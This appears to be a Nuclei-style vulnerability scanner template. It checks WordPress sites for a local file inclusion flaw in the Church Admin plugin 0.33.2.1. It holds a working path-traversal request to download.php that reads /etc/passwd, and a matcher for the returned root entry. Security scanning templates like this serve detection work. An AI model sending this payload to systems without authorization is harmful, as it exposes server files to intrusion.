http:
- matchers:
  - regex:
    - root:[x*]:0:0
    type: regex
  - status:
    - 200
    type: status
  matchers-condition: and
  method: GET
  path:
  - '{{BaseURL}}/wp-content/plugins/church-admin/display/download.php?key=../../../../../../../etc/passwd'
id: church-admin-lfi
info:
  author: 0x_Akoko
  classification:
    cvss-metrics: CVSS:3.0/AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:N/A:N
    cvss-score: 7.5
    cwe-id: CWE-22
  description: WordPress Church Admin 0.33.2.1 is vulnerable to local file inclusion
    via the "key" parameter of plugins/church-admin/display/download.php.
  metadata:
    max-request: 1
  name: WordPress Church Admin 0.33.2.1 - Local File Inclusion
  reference:
  - https://wpscan.com/vulnerability/8997
  - https://id.wordpress.org/plugins/church-admin/
  severity: high
  tags: wordpress,wp-plugin,lfi,wpscan,vuln
